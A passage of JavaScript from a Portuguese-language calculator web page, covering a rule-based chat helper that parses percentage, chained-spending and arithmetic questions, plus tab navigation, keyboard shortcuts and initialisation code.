  function tryPercentChangePatterns(norm) {
    const num = '(' + NUM_RE + ')';
    let m = norm.match(new RegExp('aument\\w*\\s+' + num + '\\s+em\\s+' + num + '\\s*%'));
    if (m) {
      const base = parsePtNumber(m[1]);
      const pct = parsePtNumber(m[2]);
      return evalAndReply(base + '*(1+' + pct + '/100)', fmtNum(base) + ' aumentado em ' + fmtNum(pct) + '%');
    }
    m = norm.match(new RegExp('diminu\\w*\\s+' + num + '\\s+em\\s+' + num + '\\s*%'));
    if (m) {
      const base = parsePtNumber(m[1]);
      const pct = parsePtNumber(m[2]);
      return evalAndReply(base + '*(1-' + pct + '/100)', fmtNum(base) + ' diminuído em ' + fmtNum(pct) + '%');
    }
    return null;
  }

  // Problemas em cadeia: um valor inicial e uma sequência de gastos/ganhos
  // em percentagem — ex.: "João tem 15.000 Kz. Gasta 30% na alimentação e
  // depois 20% do dinheiro restante em transporte. Quanto sobra?"
  // Cada percentagem aplica-se ao saldo QUE SOBRA depois do passo anterior
  // (não ao valor original) — é a leitura natural desta construção, mesmo
  // quando o verbo da segunda cláusula é omitido por elipse ("e depois 20%
  // ...", sem repetir "gasta"); nesse caso mantém-se o verbo anterior.
  function trySequentialSpendingPattern(norm) {
    const startMatch = norm.match(new RegExp('(?:tem|tinha|possui|comeca com)\\s+(' + NUM_RE + ')'));
    if (!startMatch) return null;

    const afterStart = norm.slice(startMatch.index + startMatch[0].length);
    // Exige pelo menos um verbo de gasto/ganho depois do valor inicial —
    // sem isto, "a loja tem 50% de desconto" seria mal interpretado como
    // o início de uma cadeia de gastos.
    if (!/\b(gast\w*|perd\w*|pag\w*|receb\w*|ganh\w*)\b/.test(afterStart)) return null;

    let balance = parsePtNumber(startMatch[1]);
    if (isNaN(balance)) return null;
    const startAmount = balance;

    const unitMatch = afterStart.match(/^\s*([a-z]{1,4})\b/);
    const unit = unitMatch ? ' ' + capitalize(unitMatch[1]) : '';

    const SPEND_VERBS = /\b(gast\w*|perd\w*|pag\w*)\b/;
    const GAIN_VERBS = /\b(receb\w*|ganh\w*)\b/;
    const clauseRe = new RegExp('(' + NUM_RE + ')\\s*%', 'g');

    let currentSign = -1; // por omissão assume-se gasto, até se ler um verbo diferente
    const steps = [];
    let match;
    let lastIndex = 0;
    let any = false;

    while ((match = clauseRe.exec(norm)) !== null) {
      const precedingText = norm.slice(lastIndex, match.index);
      if (GAIN_VERBS.test(precedingText)) currentSign = 1;
      else if (SPEND_VERBS.test(precedingText)) currentSign = -1;

      const pct = parsePtNumber(match[1]);
      const before = balance;
      const delta = before * (pct / 100) * currentSign;
      balance += delta;
      steps.push(
        (currentSign < 0 ? 'Gasta ' : 'Recebe ') + fmtNum(pct) + '% de ' + fmtNum(before) + unit +
        ' = ' + fmtNum(Math.abs(delta)) + unit + ' → fica com ' + fmtNum(balance) + unit
      );
      any = true;
      lastIndex = match.index + match[0].length;
    }

    if (!any) return null;

    const resultStr = fmtNum(balance) + unit;
    lastCalculation = {
      expression: 'sequência de operações a partir de ' + fmtNum(startAmount) + unit,
      result: resultStr,
      steps: steps,
    };
    return { text: 'Sobram ' + resultStr + '.' };
  }

  function tryRawExpression(rawText, norm) {
    const looksLikeQuestion = /\b(quanto|calcula|qual|resultado)\b/.test(norm);
    const looksLikeExpr = /[0-9].*[+\-*/^].*[0-9]/.test(rawText);
    if (!looksLikeQuestion && !looksLikeExpr) return null;

    let candidate = rawText
      .replace(/^.*?(quanto\s+(e|é)|calcula|qual\s+(e|é)\s+o\s+resultado\s+de)/i, '')
      .trim()
      .replace(/\bmais\b/gi, '+')
      .replace(/\bmenos\b/gi, '-')
      .replace(/\bvezes\b/gi, '*')
      .replace(/\bdividido\s+por\b/gi, '/')
      .replace(/×/g, '*')
      .replace(/÷/g, '/')
      .replace(/\?/g, '')
      .trim();

    if (!/\d/.test(candidate)) return null;

    const steps = [];
    try {
      const result = evaluateExpression(candidate, cientifica.angleMode, steps);
      const resultStr = fmtNum(result);
      lastCalculation = { expression: candidate, result: resultStr, steps: steps.length ? steps : [candidate + ' = ' + resultStr] };
      return { text: candidate + ' = ' + resultStr };
    } catch (err) {
      return null; // deixa cair para a resposta de ajuda, com sugestões
    }
  }

  function explainLastCalculation() {
    if (!lastCalculation) {
      return { text: 'Ainda não fiz nenhum cálculo nesta conversa. Pergunta-me algo primeiro, como "quanto é 12 × 7", e depois explico o raciocínio.' };
    }
    return { text: 'Eis o raciocínio para "' + lastCalculation.expression + '":', steps: lastCalculation.steps };
  }

  function fallbackHelp() {
    return {
      text: 'Não percebi bem esse pedido. Podes tentar, por exemplo: "quanto é 15% de 320", ' +
        '"converte 50 dólares para euros", "raiz quadrada de 81", "nasci em 2009, quantos anos tenho", ' +
        'ou escrever a expressão directamente, como "12 × (4 + 3)".',
    };
  }

  function interpretMessage(rawText) {
    const norm = normalize(rawText);

    if (/\b(explica|explicar|como chegaste|passo a passo|porque|justifica)\b/.test(norm)) {
      return explainLastCalculation();
    }

    const sequentialResult = trySequentialSpendingPattern(norm);
    if (sequentialResult) return sequentialResult;

    const amountMatch = norm.match(new RegExp('(' + NUM_RE + ')'));
    const currencies = findCurrencyMentions(norm);
    if (amountMatch && currencies.length >= 2) {
      return handleConversion(parsePtNumber(amountMatch[1]), currencies[0], currencies[1]);
    }

    const pctMatch = norm.match(new RegExp('(' + NUM_RE + ')\\s*(?:%|por\\s*cento)\\s*de\\s*(' + NUM_RE + ')'));
    if (pctMatch) {
      const singleCurrency = currencies[0];
      return handlePercentOf(parsePtNumber(pctMatch[1]), parsePtNumber(pctMatch[2]), singleCurrency);
    }

    const pctChangeResult = tryPercentChangePatterns(norm);
    if (pctChangeResult) return pctChangeResult;

    const dateResult = tryDateMathPatterns(norm);
    if (dateResult) return dateResult;

    const fnResult = tryNamedFunctionPatterns(norm);
    if (fnResult) return fnResult;

    const exprResult = tryRawExpression(rawText, norm);
    if (exprResult) return exprResult;

    return fallbackHelp();
  }

  function appendAiMessage(role, text, steps) {
    const container = document.getElementById('ai-messages');
    const div = document.createElement('div');
    div.className = role === 'user' ? 'ai-msg ai-msg-user' : 'ai-msg ai-msg-bot';
    div.textContent = text; // textContent (nunca innerHTML) — impede que qualquer
                             // texto introduzido seja interpretado como HTML/script.
    if (steps && steps.length) {
      const stepsDiv = document.createElement('div');
      stepsDiv.className = 'ai-msg-steps';
      stepsDiv.textContent = steps.map(function (s, i) { return (i + 1) + '. ' + s; }).join('\n');
      div.appendChild(stepsDiv);
    }
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
  }

  // Abrir/fechar o assistente — três formas de o fechar, todas equivalentes:
  // clicar no ✕, clicar de novo no botão flutuante (agora funciona como
  // alternador), premir Escape, ou clicar fora do painel.
  function openAssistantPanel() {
    document.getElementById('ai-panel').hidden = false;
    document.getElementById('ai-fab').classList.add('is-open');
    document.getElementById('ai-fab').setAttribute('aria-label', 'Fechar assistente');
    document.getElementById('ai-fab-icon').textContent = '✕';
    document.getElementById('ai-input').focus();
  }

  function closeAssistantPanel() {
    document.getElementById('ai-panel').hidden = true;
    document.getElementById('ai-fab').classList.remove('is-open');
    document.getElementById('ai-fab').setAttribute('aria-label', 'Abrir assistente');
    document.getElementById('ai-fab-icon').textContent = '✦';
  }

  function initAssistant() {
    const fab = document.getElementById('ai-fab');
    const panel = document.getElementById('ai-panel');

    fab.addEventListener('click', function () {
      if (panel.hidden) openAssistantPanel(); else closeAssistantPanel();
    });
    document.getElementById('ai-close').addEventListener('click', closeAssistantPanel);

    // Fechar ao clicar fora do painel e fora do próprio botão flutuante.
    document.addEventListener('click', function (e) {
      if (panel.hidden) return;
      if (!panel.contains(e.target) && !fab.contains(e.target)) closeAssistantPanel();
    });

    document.getElementById('ai-form').addEventListener('submit', function (e) {
      e.preventDefault();
      const input = document.getElementById('ai-input');
      const text = input.value.trim();
      if (!text) return;
      appendAiMessage('user', text);
      input.value = '';
      const reply = interpretMessage(text);
      appendAiMessage('bot', reply.text, reply.steps);
    });
  }


  /* ===========================================================================
     7. NAVEGAÇÃO ENTRE SECÇÕES
     =========================================================================== */

  function switchTab(sectionId) {
    document.querySelectorAll('.calc-section').forEach(function (sec) {
      sec.hidden = sec.id !== sectionId;
    });
    document.querySelectorAll('.tab-btn').forEach(function (btn) {
      const active = btn.dataset.section === sectionId;
      btn.classList.toggle('is-active', active);
      btn.setAttribute('aria-selected', active ? 'true' : 'false');
    });
  }

  function initTabs() {
    document.querySelectorAll('.tab-btn').forEach(function (btn) {
      btn.addEventListener('click', function () { switchTab(btn.dataset.section); });
    });
  }


  /* ===========================================================================
     8. ATALHOS DE TECLADO (Básica e Científica)
     =========================================================================== */

  function activeSectionId() {
    const el = document.querySelector('.calc-section:not([hidden])');
    return el ? el.id : null;
  }

  function handleKeydown(e) {
    const panel = document.getElementById('ai-panel');
    if (e.key === 'Escape' && panel && !panel.hidden) {
      closeAssistantPanel();
      e.preventDefault();
      return;
    }

    const active = document.activeElement;
    if (active && (active.id === 'ai-input' || active.id === 'currency-amount')) return;

    const section = activeSectionId();
    const key = e.key;

    if (section === 'basica') {
      if (/^[0-9]$/.test(key)) { basicaInputDigit(key); e.preventDefault(); }
      else if (key === '.') { basicaInputDecimal(); e.preventDefault(); }
      else if (key === '+' || key === '-' || key === '*' || key === '/') { basicaOperator(key); e.preventDefault(); }
      else if (key === 'Enter' || key === '=') { basicaEquals(); e.preventDefault(); }
      else if (key === 'Backspace') { basicaBackspace(); e.preventDefault(); }
      else if (key === 'Escape') { basicaClear(); e.preventDefault(); }
      else if (key === '%') { basicaPercent(); e.preventDefault(); }
    } else if (section === 'cientifica') {
      if (/^[0-9]$/.test(key)) { cientificaDigit(key); e.preventDefault(); }
      else if (key === '.') { cientificaDecimal(); e.preventDefault(); }
      else if ('+-*/^(),!'.includes(key)) { cientificaInsert(key); e.preventDefault(); }
      else if (key === 'Enter' || key === '=') { cientificaEquals(); e.preventDefault(); }
      else if (key === 'Backspace') { cientificaBackspace(); e.preventDefault(); }
      else if (key === 'Escape') { cientificaClear(); e.preventDefault(); }
    }
  }


  /* ===========================================================================
     9. INICIALIZAÇÃO
     =========================================================================== */

  function init() {
    initBasicaKeypad();
    initCientificaKeypad();
    initCurrency();
    initAssistant();
    initTabs();
    document.addEventListener('keydown', handleKeydown);
  }

  document.addEventListener('DOMContentLoaded', init);

})();
